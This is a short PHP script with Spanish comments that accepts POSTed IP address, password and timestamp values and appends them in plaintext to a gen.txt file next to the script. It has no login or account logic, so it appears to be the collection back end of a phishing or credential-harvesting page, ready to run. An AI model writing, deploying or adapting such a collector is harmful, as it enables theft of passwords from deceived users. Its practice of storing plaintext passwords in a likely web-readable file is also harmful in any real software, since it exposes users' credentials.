<?php
// Prevenir acceso directo al script
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 403 Forbidden');
    exit('Acceso denegado');
}

// Recibir datos del formulario
$ip = isset($_POST['ip']) ? $_POST['ip'] : 'unknown';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$timestamp = isset($_POST['timestamp']) ? $_POST['timestamp'] : date('Y-m-d H:i:s');

// Validar datos
if (empty($password)) {
    header('HTTP/1.1 400 Bad Request');
    exit('Datos incompletos');
}

// Formato de registro
$logEntry = $ip . " -- " . $password . " -- " . $timestamp . "\n";

// Ruta del archivo de registro (en la misma carpeta que el script)
$logFile = dirname(__FILE__) . '/gen.txt';

// Escribir en el archivo
$result = file_put_contents($logFile, $logEntry, FILE_APPEND);

// Verificar si se escribió correctamente
if ($result === false) {
    header('HTTP/1.1 500 Internal Server Error');
    exit('Error al escribir en el archivo');
}

// Respuesta exitosa
header('Content-Type: application/json');
echo json_encode(['success' => true]);
?>